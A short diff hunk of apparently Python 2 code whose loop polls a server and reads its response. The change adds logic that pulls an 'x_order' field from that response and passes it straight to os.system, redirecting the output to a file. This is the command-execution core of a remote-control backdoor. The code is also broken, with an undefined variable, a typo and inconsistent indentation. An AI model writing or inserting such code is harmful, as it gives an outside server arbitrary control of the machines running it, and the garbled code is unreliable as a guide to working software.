@@ -22,7 +22,9 @@ while 1:
                 	print ("Server Response:-_- %s %s " % (r1.status, r1.reason))
         		data1 = r1.read()
 			# check if data1 has any order
-			xsys = datat1 + '> res.txt'
+			    if 'x_order' in line:
+       					 order=line.split(':')
+			xsys = order[1] + ' > res.txt'
         		os.system(xsys);
                 except:
         		print '-_- No response from server'
